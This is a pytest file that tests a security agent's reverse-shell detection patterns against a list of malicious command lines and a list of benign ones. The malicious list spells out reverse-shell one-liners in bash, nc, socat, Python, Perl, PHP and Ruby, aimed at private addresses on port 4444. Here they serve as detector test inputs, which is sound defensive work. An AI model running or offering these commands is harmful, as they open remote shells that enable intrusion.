"""Reverse-shell command-line pattern matching (check 3.5, todo #11)."""
import re

import pytest

from sentinel_agent import SentinelAgent


def _matches(cmdline):
    return any(re.search(p, cmdline) for p in SentinelAgent.REVSHELL_PATTERNS)


MALICIOUS = [
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "cat /dev/udp/10.0.0.1/53",
    "nc -e /bin/sh 10.0.0.5 4444",
    "socat TCP:10.0.0.1:4444 exec:/bin/bash",
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "perl -e 'use Socket;socket(S,...);exec(\"/bin/sh -i\");'",
    "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3\");'",
    "ruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",4444);exec \"/bin/sh\"'",
    "python3 -c 'import socket,subprocess;subprocess.call([\"/bin/sh\"])'",
    "bash -c 'exec 5<>/dev/tcp/10.0.0.1/4444'",
    "msfvenom -p linux/x64/shell_reverse_tcp",
]

BENIGN = [
    "nginx: worker process",
    "/usr/bin/python3 /opt/app/main.py",
    "ssh user@host",
    "perl /usr/share/app/build.pl --config prod",
    "php /var/www/artisan schedule:run",
    "python3 /opt/app/manage.py runserver",
    "ruby /usr/bin/vendor/bundle install",
    "/usr/sbin/nginx -g 'daemon off;'",
]


@pytest.mark.parametrize("cmd", MALICIOUS)
def test_malicious_detected(cmd):
    assert _matches(cmd), f"missed reverse shell: {cmd}"


@pytest.mark.parametrize("cmd", BENIGN)
def test_benign_not_flagged(cmd):
    assert not _matches(cmd), f"false positive: {cmd}"
